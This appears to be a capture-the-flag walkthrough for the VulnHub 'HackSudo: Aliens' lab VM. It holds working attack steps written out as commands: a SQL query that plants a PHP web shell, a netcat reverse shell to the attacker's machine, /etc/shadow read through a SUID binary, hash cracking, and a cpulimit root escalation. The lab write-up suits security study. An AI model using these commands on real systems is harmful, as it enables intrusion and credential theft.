---
title: "HackSudo: Aliens CTF Walkthrough"
---

The VM can be found [here](https://www.vulnhub.com/entry/hacksudo-aliens,676/)

### nmap service scan
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV 192.168.56.160
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 10:32 EDT
Nmap scan report for 192.168.56.160
Host is up (0.0043s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
9000/tcp open  http    Apache httpd 2.4.38 ((Debian))
{% endhighlight %}

### dirb
{% highlight terminal %}
==> DIRECTORY: http://192.168.56.160/backup/             
{% endhighlight %}
inside the directory is a shell script: 
{% highlight bash %}
# Specify which database is to be backed up
db_name=""

# Set the website which this database relates to
website="localhost"

# Database credentials
user="vishal"
password="hacksudo"
host="localhost"

{% endhighlight %}
Those credentials grants us access to the PhpMyAdmin panel running on port 9000 on the system. 

navigating to the following URL shows the password hashes of the users: 
`http://192.168.56.160:9000/index.php?route=/sql&db=mysql&table=user&pos=0`

after cracking the hashes of each phpmyadmin user, I appended the passwords to the 
user list. 
cat users.txt
{% highlight text %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-aliens]
└─$ cat users.txt                                                  
hacksudo
phpmyadmin
root
shovon
vishal
123
{% endhighlight %}

gobuster on port 80: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-aliens]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.160 -q -x php,txt,html
/index.html           (Status: 200) [Size: 2225]
/images               (Status: 301) [Size: 317] [--> http://192.168.56.160/images/]
/game.html            (Status: 200) [Size: 701]                                    
/backup               (Status: 301) [Size: 317] [--> http://192.168.56.160/backup/]
/server-status        (Status: 403) [Size: 279] 
{% endhighlight %}

Back in the PhpMyAdmin Section, we can run an SQL query that writes our backdoor.php:
{% highlight SQL %}
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php"
{% endhighlight %}

This saves the command injection script to the default web root on port 80. From here
we can start a reverse TCP shell using netcat to connect to a listener set up on the 
attacking machine as follows: 

{% highlight text %}
http://192.168.56.160/backdoor.php?cmd=nc%20-e%20/bin/sh%20192.168.56.101%206666
{% endhighlight %}


Catching the connection and spawning an interactive shell:
{% highlight terminal %}
python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@hacksudo:/var/www/html$ ls /home
{% endhighlight %}

finding the SUID binaries:
{% highlight terminal %}
www-data@hacksudo:/home$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/date
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/ntfs-3g
/usr/bin/bwrap
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
{% endhighlight %}

date sticks out in that list, we can get the date command to read a file with 
elevated privileges. Here's an example of reading the shadow file to find the user
hashes on the system:

{% highlight terminal %}
www-data@hacksudo:/tmp$ date -f /etc/shadow 
date -f /etc/shadow
date: invalid date ‘root:$6$N6p.dpWhPYXSXC9U$8EraUiQ5DtMF5ov2ZbnY8DoLK1liRukqhTnTTK67MQ.tgpglkVX/I9P1aYjNeO/cwjQk9lJ/ABd9YLTMeMSn3/:18721:0:99999:7:::’
date: invalid date ‘daemon:*:18714:0:99999:7:::’
date: invalid date ‘bin:*:18714:0:99999:7:::’
date: invalid date ‘sys:*:18714:0:99999:7:::’
date: invalid date ‘sync:*:18714:0:99999:7:::’
date: invalid date ‘games:*:18714:0:99999:7:::’
date: invalid date ‘man:*:18714:0:99999:7:::’
date: invalid date ‘lp:*:18714:0:99999:7:::’
date: invalid date ‘mail:*:18714:0:99999:7:::’
date: invalid date ‘news:*:18714:0:99999:7:::’
date: invalid date ‘uucp:*:18714:0:99999:7:::’
date: invalid date ‘proxy:*:18714:0:99999:7:::’
date: invalid date ‘www-data:*:18714:0:99999:7:::’
date: invalid date ‘backup:*:18714:0:99999:7:::’
date: invalid date ‘list:*:18714:0:99999:7:::’
date: invalid date ‘irc:*:18714:0:99999:7:::’
date: invalid date ‘gnats:*:18714:0:99999:7:::’
date: invalid date ‘nobody:*:18714:0:99999:7:::’
date: invalid date ‘_apt:*:18714:0:99999:7:::’
date: invalid date ‘systemd-timesync:*:18714:0:99999:7:::’
date: invalid date ‘systemd-network:*:18714:0:99999:7:::’
date: invalid date ‘systemd-resolve:*:18714:0:99999:7:::’
date: invalid date ‘messagebus:*:18714:0:99999:7:::’
date: invalid date ‘tss:*:18714:0:99999:7:::’
date: invalid date ‘dnsmasq:*:18714:0:99999:7:::’
date: invalid date ‘usbmux:*:18714:0:99999:7:::’
date: invalid date ‘rtkit:*:18714:0:99999:7:::’
date: invalid date ‘pulse:*:18714:0:99999:7:::’
date: invalid date ‘speech-dispatcher:!:18714:0:99999:7:::’
date: invalid date ‘avahi:*:18714:0:99999:7:::’
date: invalid date ‘saned:*:18714:0:99999:7:::’
date: invalid date ‘colord:*:18714:0:99999:7:::’
date: invalid date ‘geoclue:*:18714:0:99999:7:::’
date: invalid date ‘hplip:*:18714:0:99999:7:::’
date: invalid date ‘Debian-gdm:*:18714:0:99999:7:::’
date: invalid date ‘hacksudo:$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1:18721:0:99999:7:::’
date: invalid date ‘systemd-coredump:!!:18714::::::’
date: invalid date ‘sshd:*:18714:0:99999:7:::’
date: invalid date ‘mysql:!:18720:0:99999:7:::’
www-data@hacksudo:/tmp$ 
{% endhighlight %}

Let's copy out the hacksudo password hash, save it to a file and try to crack it with
john

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctfs/hacksudo-aliens]
└─$ john hacksudo-hash.txt --show                                                1 ⨯
hacksudo:aliens:18721:0:99999:7:::

1 password hash cracked, 0 left
{% endhighlight %}
 
logging into ssh with the cracked credentials hacksudo:aliens
{% highlight terminal %}
hacksudo@192.168.56.160's password: 
Linux hacksudo 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 02:12:24 2021 from 192.168.43.217
hacksudo@hacksudo:~$ 
{% endhighlight %}

Enumerating locally: 

{% highlight terminal %}
hacksudo@hacksudo:~$ find / -perm -u=s -type f 2>/dev/null 
/home/hacksudo/Downloads/cpulimit
/usr/bin/date
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/ntfs-3g
/usr/bin/bwrap
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
{% endhighlight %}


`/home/hacksudo/Downloads/cpulimit` is likely vulnerable to the following GTFObins
oneliner: 
{% highlight terminal %}
./cpulimit -l 100 -f -- /bin/sh -p
{% endhighlight %}

{% highlight terminal %}
hacksudo@hacksudo:~/Downloads$ ./cpulimit -l 100 -f -- /bin/sh -p
Process 2312 detected
# id
uid=1000(hacksudo) gid=1000(hacksudo) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner),1000(hacksudo)
# 
# cd /root
# ls
root.txt
# cat root.txt
 _   _            _                  _       
| | | | __ _  ___| | _____ _   _  __| | ___  
| |_| |/ _` |/ __| |/ / __| | | |/ _` |/ _ \ 
|  _  | (_| | (__|   <\__ \ |_| | (_| | (_) |
|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/ 
                                             
    _    _ _            ____   __   
   / \  | (_) ___ _ __ | ___| / /_  
  / _ \ | | |/ _ \ '_ \|___ \| '_ \ 
 / ___ \| | |  __/ | | |___) | (_) |
/_/   \_\_|_|\___|_| |_|____/ \___/ 

congratulations you rooted hacksudo alien56...!!!
flag={d045e6f9feb79e94442213f9d008ac48}
# 
{% endhighlight %}

